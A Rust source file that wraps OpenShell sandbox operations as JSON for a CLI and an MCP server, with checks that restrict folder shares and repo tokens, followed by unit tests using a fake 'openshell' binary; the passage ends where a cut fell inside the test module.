//! Sandbox operations for a headless front end, each answering in JSON. `envelope` is the
//! output contract: the value and exit code 0, or `{"ok":false,"error":...}` and 1.

use crate::sandbox::{self, CreateCtx, SandboxSpec, Share};
use crate::{cli, ghrepo};
use serde_json::{json, Value};
use std::os::unix::process::ExitStatusExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// What every operation runs against.
#[derive(Clone)]
pub struct Ctx {
    /// The data dir (`sandbox-policy.yaml`, `toolchains.toml`, `images/`).
    pub dir: PathBuf,
    /// The gateway to target; `None` = the OpenShell CLI's active one.
    pub gateway: Option<String>,
    /// A spec may mount a host folder only when the caller opted in.
    pub allow_share: bool,
    /// Refuse a share of a risky folder (`sandbox::risky_share`: the disk, the home folder, a
    /// secrets folder, a system folder) instead of only noting it. True for `osh mcp`, whose
    /// specs come from an agent; false for the CLI, whose user names the folder.
    pub refuse_risky_share: bool,
    /// The variables `repo.env_var` may name; `None` = any (the CLI). The MCP server sets the
    /// operator's list, so an agent cannot send an unrelated secret of the server to a forge.
    pub repo_vars: Option<Vec<String>>,
    /// The folders a share must lie in, as canonical paths; `None` = anywhere (the CLI). The
    /// MCP server sets the operator's `OSH_MCP_SHARE_ROOT`, an empty list refusing every share.
    pub share_roots: Option<Vec<PathBuf>>,
    /// The version of the program serving the calls (the MCP `serverInfo`).
    pub version: String,
    /// The longest a background job may run, in seconds (`0` = no limit): the operator's
    /// `mcp.job_max_secs`. Only MCP starts jobs; the CLI leaves it `0`.
    pub job_max_secs: u64,
}

/// Aim every following `openshell` call at the context's gateway. A name starting with `-`
/// would be read by `openshell` as an option after `-g`, so it is refused.
fn target(ctx: &Ctx) -> Result<(), String> {
    let gw = ctx.gateway.as_deref().unwrap_or("");
    if gw.starts_with('-') {
        return Err(format!(
            "invalid gateway name {gw:?}: a gateway name cannot start with `-`"
        ));
    }
    cli::set_thread_gateway(Some(gw));
    Ok(())
}

pub(crate) fn check_name(name: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err("field `name` is required".into());
    }
    sandbox::validate_name(name)
}

/// A spec that passed every check, with the share path resolved, and what the caller should
/// be told about it.
struct Checked {
    spec: SandboxSpec,
    note: Option<String>,
}

fn home() -> String {
    std::env::var("HOME").unwrap_or_default()
}

/// The spec, checked before anything runs: a valid name, a repo variable the caller allows, and
/// a share only when allowed, only of a folder that is really there, resolved through symlinks
/// (the resolved path is what gets mounted) and, when the context says so, not a risky one.
fn checked_spec(ctx: &Ctx, spec: &Value, home: &str) -> Result<Checked, String> {
    let mut s = SandboxSpec::from_json(spec)?;
    check_name(&s.name)?;
    if let Some(g) = &s.repo {
        check_repo_var(ctx, &g.env_var)?;
    }
    let mut note = None;
    if let Some(share) = &mut s.share {
        if !ctx.allow_share {
            return Err(
                "the spec shares a host folder (`share`), which needs the allow-share option"
                    .into(),
            );
        }
        share.path = resolve_share_path(share)?;
        if let Some(roots) = &ctx.share_roots {
            check_share_root(roots, &share.path)?;
        }
        // The home folder is resolved too, so a symlinked home still matches.
        let home = std::fs::canonicalize(home)
            .ok()
            .and_then(|h| h.to_str().map(String::from))
            .unwrap_or_else(|| home.to_string());
        // The data folder holds the bearer token and the stored secrets: a share of it, or of a
        // folder around it, would hand them to the sandbox.
        let mut risky = sandbox::risky_share(&share.path, &home);
        if let Ok(data) = std::fs::canonicalize(&ctx.dir) {
            let p = Path::new(&share.path);
            if p.starts_with(&data) || data.starts_with(p) {
                risky = Some("it holds osh's own data (tokens)".to_string());
            }
        }
        if let Some(why) = risky {
            if ctx.refuse_risky_share {
                return Err(format!(
                    "sharing {} is refused: {why}; share a project folder instead",
                    share.path
                ));
            }
            note = Some(format!("sharing {} is risky: {why}", share.path));
        }
    }
    Ok(Checked { spec: s, note })
}

/// `repo.env_var` must be one the caller allows (`Ctx::repo_vars`). The refusal names the
/// variable only, never a value.
fn check_repo_var(ctx: &Ctx, var: &str) -> Result<(), String> {
    // A token the operator stored (`osh mcp secret set NAME`) is allowed by that very act.
    if crate::secrets::get(&ctx.dir, var).is_some() {
        return Ok(());
    }
    allowed_by_list(ctx, var)
}

/// What the refusal tells the agent to ask for. The name is the agent's own text, so it only
/// appears in a command line when it is a plain variable name.
fn secret_hint(var: &str) -> String {
    // The names already stored are not listed: a misled agent would learn which ones to target.
    // The user names the one to use in their request.
    if crate::secrets::valid_name(var) {
        format!(
            "to allow {var}, the user runs `osh mcp secret set {var}` in a terminal of their own, outside this chat (it asks for the token with a hidden prompt)"
        )
    } else {
        "a token is stored by the user with `osh mcp secret set NAME`, in a terminal of their own"
            .to_string()
    }
}

/// The operator's list of environment variables a spec may name (`mcp.repo_vars`).
fn allowed_by_list(ctx: &Ctx, var: &str) -> Result<(), String> {
    match &ctx.repo_vars {
        None => Ok(()),
        Some(list) if list.is_empty() => Err(format!(
            "repo grants are off: the server operator has not listed any variable in OSH_MCP_REPO_VARS and stored no token; {}",
            secret_hint(var)
        )),
        Some(list) if list.iter().any(|v| v == var) => Ok(()),
        Some(_) => Err(format!(
            "repo.env_var {var:?} is not one of the variables the server operator allows (OSH_MCP_REPO_VARS); {}",
            secret_hint(var)
        )),
    }
}

/// The resolved share path must be one of the roots or inside one. Both sides are canonical,
/// so a symlink or `..` cannot step out, and the comparison is by whole components: `/a/b-x`
/// is not inside `/a/b`. The refusal names the path and the variable, not the roots.
fn check_share_root(roots: &[PathBuf], path: &str) -> Result<(), String> {
    if roots.is_empty() {
        return Err(format!(
            "sharing {path} is refused: shares are off until the server operator lists a root folder in OSH_MCP_SHARE_ROOT"
        ));
    }
    if roots.iter().any(|r| Path::new(path).starts_with(r)) {
        return Ok(());
    }
    Err(format!(
        "sharing {path} is refused: it is outside the allowed share roots (OSH_MCP_SHARE_ROOT)"
    ))
}

/// The share path as an absolute, symlink-free path of an existing directory.
fn resolve_share_path(share: &Share) -> Result<String, String> {
    let p = Path::new(&share.path);
    if !p.is_absolute() {
        return Err(format!(
            "share.path {:?} must be an absolute path",
            share.path
        ));
    }
    let real = std::fs::canonicalize(p)
        .map_err(|e| format!("share.path {:?} cannot be resolved: {e}", share.path))?;
    if !real.is_dir() {
        return Err(format!("share.path {:?} is not a directory", share.path));
    }
    real.into_os_string()
        .into_string()
        .map_err(|_| format!("share.path {:?} is not valid UTF-8", share.path))
}

/// Two notes as one string; either may be absent.
fn join_notes(a: Option<String>, b: Option<String>) -> Option<String> {
    match (a, b) {
        (Some(a), Some(b)) => Some(format!("{a}; {b}")),
        (a, b) => a.or(b),
    }
}

/// The secret named by `repo.env_var`, read from this process's environment, else from the store. Errors name the
/// variable only, never its value.
fn repo_secret(ctx: &Ctx, var: &str) -> Result<String, String> {
    if var.is_empty() || var.contains(['=', '\0']) {
        return Err(format!("repo.env_var {var:?} is not a variable name"));
    }
    // A name the operator stored takes its value from the store, never from the environment:
    // the server's own variables (cloud keys, a broad GITHUB_TOKEN) are not reachable by
    // storing a dummy under their name.
    if let Some(v) = crate::secrets::get(&ctx.dir, var) {
        return Ok(v);
    }
    allowed_by_list(ctx, var)?;
    match std::env::var_os(var) {
        Some(v) if !v.is_empty() => v
            .into_string()
            .map_err(|_| format!("environment variable {var} (repo.env_var) is not valid UTF-8")),
        _ => Err(format!(
            "environment variable {var} (repo.env_var) is unset or empty and no token is stored under that name; {}",
            secret_hint(var)
        )),
    }
}

/// The Dockerfile image the spec names, if any, with whether it is built: the only image
/// `plan_create` looks at, so only it is inspected.
fn images_for(dir: &Path, image: &str) -> Vec<cli::Image> {
    if image.is_empty() {
        return Vec::new();
    }
    cli::dockerfiles(dir)
        .into_iter()
        .filter(|f| cli::dockerfile_tag(f) == image)
        .map(|file| {
            let tag = cli::dockerfile_tag(&file);
            cli::Image {
                built: cli::image_built(&tag),
                tag,
                file,
                freshness: Default::default(),
            }
        })
        .collect()
}

/// `[{"name","phase","created"}]` for the sandboxes on the gateway.
pub fn sandbox_list(ctx: &Ctx) -> Result<Value, String> {
    target(ctx)?;
    let list = cli::sandboxes()?;
    Ok(Value::Array(
        list.into_iter()
            .map(|s| json!({"name": s.name, "phase": s.phase, "created": s.created}))
            .collect(),
    ))
}

/// Create a sandbox from a JSON spec. With `dry_run`, only the plan: `{"name","steps"}`
/// (secrets travel through the environment, so the argv shown holds none). Otherwise the repo
/// provider first (when the spec grants a repo), then the plan's steps: `{"name","phase"}`.
pub fn sandbox_create(ctx: &Ctx, spec: &Value, dry_run: bool) -> Result<Value, String> {
    create_in(ctx, spec, dry_run, &home())
}

fn create_in(ctx: &Ctx, spec: &Value, dry_run: bool, home: &str) -> Result<Value, String> {
    let Checked {
        spec: s,
        note: share_note,
    } = checked_spec(ctx, spec, home)?;
    let grant = match &s.repo {
        Some(g) => Some((sandbox::grant_repo(&g.url)?, repo_secret(ctx, &g.env_var)?)),
        None => None,
    };
    target(ctx)?;
    let images = images_for(&ctx.dir, &s.image);
    let driver = if s.share.is_some() {
        cli::gateway_driver()
    } else {
        String::new()
    };
    let plan = sandbox::plan_create(
        &s,
        &CreateCtx {
            dir: &ctx.dir,
            driver: &driver,
            images: &images,
            rebuild: false,
        },
    )?;
    let mut out = if dry_run {
        let steps: Vec<Value> = plan
            .steps
            .iter()
            .map(|st| json!({"prog": st.prog, "args": st.args}))
            .collect();
        Ok(json!({"name": s.name, "steps": steps}))
    } else {
        run_plan(
            &s.name,
            &plan.steps,
            grant.as_ref().map(|(r, v)| (r, v.as_str())),
            !s.command.is_empty(),
        )
    };
    // The policy was written for this call alone; the gateway has read it by now.
    if let Some(p) = &plan.policy_file {
        let _ = std::fs::remove_file(p);
    }
    if let (Ok(v), Some(note)) = (&mut out, join_notes(share_note, plan.policy_note)) {
        v["note"] = Value::String(note);
    }
    out
}

/// Delete and untrack a repo provider this call made (best effort).
fn drop_made(provider: &str) {
    if cli::os(&["provider", "delete", provider]).is_ok() {
        ghrepo::untrack(ghrepo::tracked_path().as_deref(), &cli::gateway(), provider);
    }
}

/// Create the repo provider (when granted), then run the steps. When a step fails after the
/// provider was made, the provider is deleted and untracked again (best effort), so a retry
/// does not trip over it; one that could not be made (it may already exist) is left alone.
/// A `one_shot` create (`--no-keep`) has deleted its sandbox by the time it returns, so the
/// provider made for it is dropped the same way whether the command succeeded or not.
fn run_plan(
    name: &str,
    steps: &[sandbox::Step],
    grant: Option<(&ghrepo::GhRepo, &str)>,
    one_shot: bool,
) -> Result<Value, String> {
    let made = match grant {
        Some((repo, secret)) => {
            let provider = ghrepo::provider_name(name, repo);
            cli::create_repo_provider(repo, &provider, secret)?;
            Some(provider)
        }
        None => None,
    };
    for st in steps {
        // The plan's `openshell` args already carry the gateway, so `run`, not `exec`.
        if let Err(e) = cli::run(&st.prog, &st.args, &[]) {
            if let Some(p) = &made {
                drop_made(p);
            }
            return Err(format!("{}: {e}", st.label()));
        }
    }
    if one_shot {
        if let Some(p) = &made {
            drop_made(p);
        }
    }
    let phase = cli::sandboxes()
        .ok()
        .and_then(|l| l.into_iter().find(|x| x.name == name))
        .map(|x| x.phase)
        .unwrap_or_default();
    Ok(json!({"name": name, "phase": phase}))
}

/// Delete a sandbox and, as the dashboard does, the per-sandbox repo providers osh made for it.
/// A sandbox that is no longer listed (a one-shot create deletes its own) is not an error: its
/// repo providers are still dropped and the answer says `already_gone`. When the list cannot be
/// read, the delete is tried as usual.
pub fn sandbox_delete(ctx: &Ctx, name: &str) -> Result<Value, String> {
    check_name(name)?;
    target(ctx)?;
    let listed = cli::sandboxes().map_or(true, |l| l.iter().any(|x| x.name == name));
    let providers = cli::providers().unwrap_or_default();
    if !listed {
        cli::drop_repo_providers(name, &providers);
        return Ok(json!({"name": name, "deleted": false, "already_gone": true}));
    }
    cli::os(&["sandbox", "delete", name])?;
    cli::drop_repo_providers(name, &providers);
    Ok(json!({"name": name, "deleted": true}))
}

/// Run `argv` in a sandbox with `openshell sandbox exec`, giving up after `timeout_secs`. The
/// command's exit code (a signal as 128 + its number) and both streams come back as they are;
/// only failing to run `openshell` is `Err`.
pub(crate) fn run_in_sandbox(
    ctx: &Ctx,
    name: &str,
    argv: &[String],
    timeout_secs: u64,
    no_login_shell: bool,
) -> Result<(i32, Vec<u8>, Vec<u8>), String> {
    check_name(name)?;
    if argv.is_empty() {
        return Err("no command to run".into());
    }
    target(ctx)?;
    let mut args: Vec<String> = ["sandbox", "exec", "-n", name, "--timeout"]
        .map(String::from)
        .to_vec();
    args.push(timeout_secs.to_string());
    if no_login_shell {
        args.push("--no-login-shell".into());
    }
    args.push("--".into());
    args.extend(argv.iter().cloned());
    // Not `cli::exec`: it turns a non-zero exit into `Err` and drops the code, while the
    // command's own exit code and both streams are the answer here.
    let mut cmd = Command::new("openshell");
    cmd.args(cli::with_gateway(args));
    // `--timeout` times the command, not the connection to a gateway that has stopped answering.
    let out = output_within(
        cmd,
        std::time::Duration::from_secs(timeout_secs.saturating_add(15)),
    )?;
    let code = out
        .status
        .code()
        .or_else(|| out.status.signal().map(|s| 128 + s))
        .unwrap_or(-1);
    Ok((code, out.stdout, out.stderr))
}

/// Run a prepared `openshell` command and wait at most `limit` for it, then kill it. Output is
/// read as it comes, so a command that writes a lot cannot stall on a full pipe.
pub(crate) fn output_within(
    mut cmd: Command,
    limit: std::time::Duration,
) -> Result<std::process::Output, String> {
    use std::io::Read;
    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = cmd.spawn().map_err(|e| format!("openshell: {e}"))?;
    fn slurp<R: Read>(pipe: Option<R>) -> Vec<u8> {
        let mut v = Vec::new();
        if let Some(mut p) = pipe {
            let _ = p.read_to_end(&mut v);
        }
        v
    }
    let (so, se) = (child.stdout.take(), child.stderr.take());
    let t_out = std::thread::spawn(move || slurp(so));
    let t_err = std::thread::spawn(move || slurp(se));
    let end = std::time::Instant::now() + limit;
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                return Ok(std::process::Output {
                    status,
                    stdout: t_out.join().unwrap_or_default(),
                    stderr: t_err.join().unwrap_or_default(),
                })
            }
            Ok(None) if std::time::Instant::now() >= end => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!("openshell did not answer within {limit:?}"));
            }
            Ok(None) => std::thread::sleep(std::time::Duration::from_millis(20)),
            Err(e) => return Err(format!("openshell: {e}")),
        }
    }
}

/// Whether the gateway the context aims at lists a sandbox of this name. `Err` when the list
/// could not be had: not knowing is not "gone".
pub(crate) fn sandbox_exists(ctx: &Ctx, name: &str) -> Result<bool, String> {
    target(ctx)?;
    let mut cmd = Command::new("openshell");
    cmd.args(cli::with_gateway(
        ["sandbox", "list", "--output", "json"]
            .map(String::from)
            .to_vec(),
    ));
    let out = output_within(cmd, std::time::Duration::from_secs(30))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let v: Value = serde_json::from_slice(&out.stdout).map_err(|e| e.to_string())?;
    Ok(cli::parse_sandboxes(&v).iter().any(|s| s.name == name))
}

/// The name of the gateway the OpenShell CLI uses by default, when it names one.
pub(crate) fn active_gateway() -> Result<Option<String>, String> {
    let mut cmd = Command::new("openshell");
    cmd.args(["gateway", "list", "-o", "json"]);
    let out = output_within(cmd, std::time::Duration::from_secs(30))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let v: Value = serde_json::from_slice(&out.stdout).map_err(|e| e.to_string())?;
    Ok(cli::parse_gateways(&v)
        .into_iter()
        .find(|g| g.active)
        .map(|g| g.name))
}

/// Run `argv` in a sandbox. The command's own exit code, non-zero included, is `Ok`; only
/// failing to run `openshell` is `Err`.
pub fn sandbox_exec(ctx: &Ctx, name: &str, argv: &[String]) -> Result<Value, String> {
    let (code, stdout, stderr) = run_in_sandbox(ctx, name, argv, 600, false)?;
    Ok(json!({
        "exit_code": code,
        "stdout": String::from_utf8_lossy(&stdout),
        "stderr": String::from_utf8_lossy(&stderr),
    }))
}

/// Create the sandbox unless one of that name exists; an existing one is left as it is. A
/// `note` from the create (risky share, policy) is passed on.
pub fn apply(ctx: &Ctx, spec: &Value) -> Result<Value, String> {
    apply_in(ctx, spec, &home())
}

fn apply_in(ctx: &Ctx, spec: &Value, home: &str) -> Result<Value, String> {
    let s = checked_spec(ctx, spec, home)?.spec;
    target(ctx)?;
    if cli::sandboxes()?.iter().any(|x| x.name == s.name) {
        return Ok(json!({"action": "unchanged", "name": s.name}));
    }
    let made = create_in(ctx, spec, false, home)?;
    let mut out = json!({"action": "created", "name": s.name});
    if let Some(n) = made.get("note") {
        out["note"] = n.clone();
    }
    Ok(out)
}

/// The output contract: `Ok(v)` prints `v` and exits 0; `Err(e)` prints
/// `{"ok":false,"error":e}` and exits 1.
pub fn envelope(r: Result<Value, String>) -> (Value, i32) {
    match r {
        Ok(v) => (v, 0),
        Err(e) => (json!({"ok": false, "error": e}), 1),
    }
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::ghrepo;
    use serde_json::json;
    use std::ffi::OsString;
    use std::os::unix::fs::PermissionsExt;
    use std::path::Path;
    use std::sync::{Mutex, MutexGuard};

    /// Tests here change PATH and process-wide variables, so they run one at a time.
    static ENV: Mutex<()> = Mutex::new(());

    const FAKE_VARS: &[&str] = &[
        "OSH_FAKE_SANDBOXES",
        "OSH_FAKE_PROVIDERS",
        "OSH_FAKE_GATEWAYS",
        "OSH_FAKE_GATEWAY_INFO",
        "OSH_FAKE_FAIL",
        "OSH_FAKE_FAIL_ONCE",
        "OSH_FAKE_EXEC_EXIT",
        "OSH_FAKE_EXEC_STDOUT",
        "OSH_FAKE_EXEC_STDERR",
        "OSH_FAKE_ENV_KEYS",
        "OSH_FAKE_EXEC_RUN",
    ];

    /// The stand-in `openshell` (and a failing `curl`, so a repo grant never reaches the
    /// network) first on PATH, a seeded data dir, and the call log.
    pub(crate) struct Fake {
        pub(crate) dir: PathBuf,
        pub(crate) log: PathBuf,
        path: Option<OsString>,
        _lock: MutexGuard<'static, ()>,
    }

    impl Fake {
        pub(crate) fn new(tag: &str) -> Fake {
            let lock = ENV.lock().unwrap_or_else(|e| e.into_inner());
            let root =
                std::env::temp_dir().join(format!("osh-core-ops-{tag}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&root);
            let bin = root.join("bin");
            let dir = root.join("data");
            std::fs::create_dir_all(&bin).unwrap();
            std::fs::create_dir_all(&dir).unwrap();
            for f in ["sandbox-policy.yaml", "toolchains.toml"] {
                std::fs::write(dir.join(f), crate::assets::embedded(f).unwrap()).unwrap();
            }
            let script = Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fake-openshell.sh");
            let fake = bin.join("openshell");
            std::fs::copy(&script, &fake).unwrap();
            std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).unwrap();
            let curl = bin.join("curl");
            std::fs::write(&curl, "#!/bin/sh\nexit 7\n").unwrap();
            std::fs::set_permissions(&curl, std::fs::Permissions::from_mode(0o755)).unwrap();
            let log = root.join("calls.log");
            std::fs::write(&log, "").unwrap();
            let path = std::env::var_os("PATH");
            let mut dirs = vec![bin];
            dirs.extend(std::env::split_paths(path.as_deref().unwrap_or_default()));
            std::env::set_var("PATH", std::env::join_paths(dirs).unwrap());
            std::env::set_var("OSH_FAKE_LOG", &log);
            std::env::set_var("OSH_JOBS_SANDBOX_DIR", root.join("jobs"));
            for v in FAKE_VARS {
                std::env::remove_var(v);
            }
            crate::cli::set_gateway("");
            Fake {
                dir,
                log,
                path,
                _lock: lock,
            }
        }

        pub(crate) fn ctx(&self) -> Ctx {
            Ctx {
                dir: self.dir.clone(),
                gateway: None,
                allow_share: false,
                refuse_risky_share: false,
                repo_vars: None,
                share_roots: None,
                version: "0.0.0-test".into(),
                job_max_secs: 0,
            }
        }

        pub(crate) fn calls(&self) -> String {
            std::fs::read_to_string(&self.log).unwrap()
        }
    }

    impl Drop for Fake {
        fn drop(&mut self) {
            match &self.path {
                Some(p) => std::env::set_var("PATH", p),
                None => std::env::remove_var("PATH"),
            }
            std::env::remove_var("OSH_FAKE_LOG");
            for v in FAKE_VARS {
                std::env::remove_var(v);
            }
            crate::cli::set_gateway("");
        }
    }

    fn spec() -> Value {
        json!({"name":"w1","image":"img:1","providers":["npm"],"cpu":"2","memory":"4Gi"})
    }

    #[test]
    fn create_requires_valid_name() {
        let f = Fake::new("name");
        for bad in [json!({}), json!({"name":""}), json!({"name":"../x"})] {
            let e = sandbox_create(&f.ctx(), &bad, false).unwrap_err();
            assert!(e.contains("name"), "{e}");
        }
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn create_rejects_bad_spec_without_calls() {
        let f = Fake::new("badspec");
        let e = sandbox_create(&f.ctx(), &json!({"name":"w1","cpus":2}), false).unwrap_err();
        assert!(e.contains("cpus"), "{e}");
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn create_dry_run_does_not_call_openshell_write() {
        let f = Fake::new("dry");
        let v = sandbox_create(&f.ctx(), &spec(), true).unwrap();
        assert_eq!(v["name"], "w1");
        let steps = v["steps"].as_array().unwrap();
        let last = steps.last().unwrap();
        assert_eq!(last["prog"], "openshell");
        let args: Vec<&str> = last["args"]
            .as_array()
            .unwrap()
            .iter()
            .map(|a| a.as_str().unwrap())
            .collect();
        assert_eq!(&args[..2], ["sandbox", "create"]);
        assert!(args.contains(&"--detach"), "{args:?}");
        let calls = f.calls();
        assert!(!calls.contains("create"), "{calls}");
        assert!(!calls.contains("delete"), "{calls}");
    }

    #[test]
    fn create_runs_plan_steps_in_order() {
        let f = Fake::new("run");
        let v = sandbox_create(&f.ctx(), &spec(), false).unwrap();
        assert_eq!(v["name"], "w1");
        assert!(v.get("phase").is_some(), "{v}");
        let calls = f.calls();
        let line = calls
            .lines()
            .find(|l| l.starts_with("sandbox create"))
            .unwrap_or_else(|| panic!("{calls}"));
        let prefix = format!("sandbox create --policy {}/", f.dir.display());
        let tail = " --name w1 --from img:1 --cpu 2 --memory 4Gi --provider npm --detach";
        assert!(line.starts_with(&prefix) && line.ends_with(tail), "{line}");
        let policy = &line[prefix.len() - 1..line.len() - tail.len()];
        assert!(!policy.contains(' '), "{policy}");
        assert_ne!(
            policy,
            format!("/{}", ".sandbox-policy.generated.yaml"),
            "{line}"
        );
    }

    /// The `--policy` path of the `sandbox create` line in `calls`.
    fn policy_arg(calls: &str) -> PathBuf {
        let line = calls
            .lines()
            .find(|l| l.starts_with("sandbox create"))
            .unwrap_or_else(|| panic!("{calls}"));
        let mut it = line.split(' ').skip_while(|w| *w != "--policy");
        PathBuf::from(it.nth(1).unwrap())
    }

    #[test]
    fn the_per_call_policy_is_removed_after_the_create() {
        let f = Fake::new("policy-rm");
        sandbox_create(&f.ctx(), &spec(), false).unwrap();
        let p = policy_arg(&f.calls());
        assert!(p.starts_with(&f.dir), "{p:?}");
        assert!(!p.exists(), "{p:?}");
        // And after a failed create too.
        std::fs::write(&f.log, "").unwrap();
        std::env::set_var("OSH_FAKE_FAIL", "sandbox create");
        sandbox_create(&f.ctx(), &spec(), false).unwrap_err();
        let p = policy_arg(&f.calls());
        assert!(!p.exists(), "{p:?}");
        assert!(f.dir.join("sandbox-policy.yaml").is_file());
    }

    #[test]
    fn a_policy_note_is_returned_as_note() {
        let f = Fake::new("note");
        std::fs::write(f.dir.join("toolchains.toml"), "not [valid").unwrap();
        for dry in [true, false] {
            let v = sandbox_create(&f.ctx(), &spec(), dry).unwrap();
            let note = v["note"].as_str().unwrap_or_else(|| panic!("{v}"));
            assert!(note.contains("toolchains.toml"), "{note}");
        }
        std::fs::write(
            f.dir.join("toolchains.toml"),
            crate::assets::embedded("toolchains.toml").unwrap(),
        )
        .unwrap();
        let v = sandbox_create(&f.ctx(), &spec(), true).unwrap();
        assert!(v.get("note").is_none(), "{v}");
    }

    #[test]
    fn a_gateway_that_looks_like_a_flag_is_refused() {
        let f = Fake::new("gw-flag");
        let ctx = Ctx {
            gateway: Some("--help".into()),
            ..f.ctx()
        };
        let e = sandbox_create(&ctx, &spec(), false).unwrap_err();
        assert!(e.contains("gateway"), "{e}");
        assert!(sandbox_list(&ctx).is_err());
        assert!(sandbox_delete(&ctx, "w1").is_err());
        assert!(sandbox_exec(&ctx, "w1", &["ls".into()]).is_err());
        assert!(apply(&ctx, &spec()).is_err());
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn a_failed_create_deletes_the_repo_provider_it_made() {
        let f = Fake::new("repo-cleanup");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        std::env::set_var("OSH_FAKE_FAIL", "sandbox create");
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        let e = r.unwrap_err();
        assert!(e.contains("fake failure"), "{e}");
        let calls = f.calls();
        let lines: Vec<&str> = calls.lines().collect();
        let made = lines
            .iter()
            .position(|l| l.starts_with("provider create --name github-w1-r"))
            .unwrap_or_else(|| panic!("{calls}"));
        let failed = lines
            .iter()
            .position(|l| l.starts_with("sandbox create"))
            .unwrap();
        let gone = lines
            .iter()
            .position(|l| *l == "provider delete github-w1-r")
            .unwrap_or_else(|| panic!("{calls}"));
        assert!(made < failed && failed < gone, "{calls}");
    }

    #[test]
    fn a_provider_that_could_not_be_made_is_not_deleted() {
        let f = Fake::new("repo-exists");
        std::env::set_var("OSH_TEST_TOK", secret_value());
        std::env::set_var("OSH_FAKE_FAIL", "provider create");
        let r = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false);
        std::env::remove_var("OSH_TEST_TOK");
        assert!(r.is_err());
        let calls = f.calls();
        assert!(!calls.contains("provider delete"), "{calls}");
        assert!(!calls.contains("sandbox create"), "{calls}");
    }

    #[test]
    fn create_reports_phase_from_the_listing() {
        let f = Fake::new("phase");
        std::env::set_var(
            "OSH_FAKE_SANDBOXES",
            r#"{"sandboxes":[{"name":"w1","phase":"Ready","created_at":"t"}]}"#,
        );
        let v = sandbox_create(&f.ctx(), &spec(), false).unwrap();
        assert_eq!(v, json!({"name":"w1","phase":"Ready"}));
    }

    #[test]
    fn create_failure_is_err() {
        let f = Fake::new("fail");
        std::env::set_var("OSH_FAKE_FAIL", "sandbox create");
        let e = sandbox_create(&f.ctx(), &spec(), false).unwrap_err();
        assert!(e.contains("fake failure"), "{e}");
    }

    #[test]
    fn gateway_from_ctx_targets_every_call() {
        let f = Fake::new("gw");
        let ctx = Ctx {
            gateway: Some("gw1".into()),
            ..f.ctx()
        };
        sandbox_create(&ctx, &spec(), false).unwrap();
        let calls = f.calls();
        assert!(!calls.is_empty());
        assert!(calls.lines().all(|l| l.starts_with("-g gw1 ")), "{calls}");
        assert!(!calls.contains("-g gw1 -g"), "{calls}");
    }

    fn with_share(path: &Path) -> Value {
        let mut s = spec();
        s["share"] = json!({"path": path.to_string_lossy(), "rw": false});
        s
    }

    #[test]
    fn share_rejected_unless_allowed() {
        let f = Fake::new("share-no");
        let e = sandbox_create(&f.ctx(), &with_share(&f.dir), false).unwrap_err();
        assert!(e.contains("share"), "{e}");
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn share_allowed_with_flag() {
        let f = Fake::new("share-yes");
        let ctx = Ctx {
            allow_share: true,
            ..f.ctx()
        };
        sandbox_create(&ctx, &with_share(&f.dir), false).unwrap();
        let calls = f.calls();
        assert!(calls.contains("gateway info"), "{calls}");
        let create = calls
            .lines()
            .find(|l| l.starts_with("sandbox create"))
            .unwrap();
        assert!(
            create.contains("--driver-config-json {\"docker\":"),
            "{create}"
        );
        assert!(create.contains("\"target\":\"/sandbox/data\""), "{create}");
    }

    #[test]
    fn share_path_must_be_an_existing_absolute_dir() {
        let f = Fake::new("share-path");
        let ctx = Ctx {
            allow_share: true,
            ..f.ctx()
        };
        let file = f.dir.join("sandbox-policy.yaml");
        let missing = f.dir.join("nope");
        for bad in [Path::new("rel/dir"), Path::new(""), &missing, &file] {
            let e = sandbox_create(&ctx, &with_share(bad), false).unwrap_err();
            assert!(e.contains("share.path"), "{bad:?}: {e}");
        }
        assert_eq!(f.calls(), "");
    }

    #[test]
    fn share_on_unknown_driver_is_err() {
        let f = Fake::new("share-drv");
        std::env::set_var("OSH_FAKE_GATEWAY_INFO", "{}");
        let ctx = Ctx {
            allow_share: true,
            ..f.ctx()
        };
        let e = sandbox_create(&ctx, &with_share(&f.dir), false).unwrap_err();
        assert!(e.contains("driver"), "{e}");
        assert!(!f.calls().contains("sandbox create"));
    }

    fn with_repo(var: &str) -> Value {
        let mut s = spec();
        s["repo"] = json!({"url": "https://github.com/o/r", "env_var": var});
        s
    }

    fn secret_value() -> String {
        format!("tok-{}", "x".repeat(24))
    }

    #[test]
    fn env_var_unset_is_error_and_value_never_leaks() {
        let f = Fake::new("repo-unset");
        std::env::remove_var("OSH_TEST_UNSET");
        let e = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_UNSET"), false).unwrap_err();
        assert!(e.contains("OSH_TEST_UNSET"), "{e}");
        std::env::set_var("OSH_TEST_EMPTY", "");
        let e = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_EMPTY"), false).unwrap_err();
        assert!(e.contains("OSH_TEST_EMPTY"), "{e}");
        std::env::remove_var("OSH_TEST_EMPTY");
        assert_eq!(f.calls(), "");

        // Set, but the provider cannot be created: the error and argv carry no secret.
        let value = secret_value();
        std::env::set_var("OSH_TEST_TOK", &value);
        std::env::set_var("OSH_FAKE_FAIL", "provider create");
        let e = sandbox_create(&f.ctx(), &with_repo("OSH_TEST_TOK"), false).unwrap_err();
        std::env::remove_var("OSH_TEST_TOK");
        assert!(!e.contains(&value), "{e}");
        let calls = f.calls();
        assert!(calls.contains("provider create"), "{calls}");
        assert!(!calls.contains(&value), "{calls}");
        assert!(!calls.contains("sandbox create"), "{calls}");
    }

    #[test]
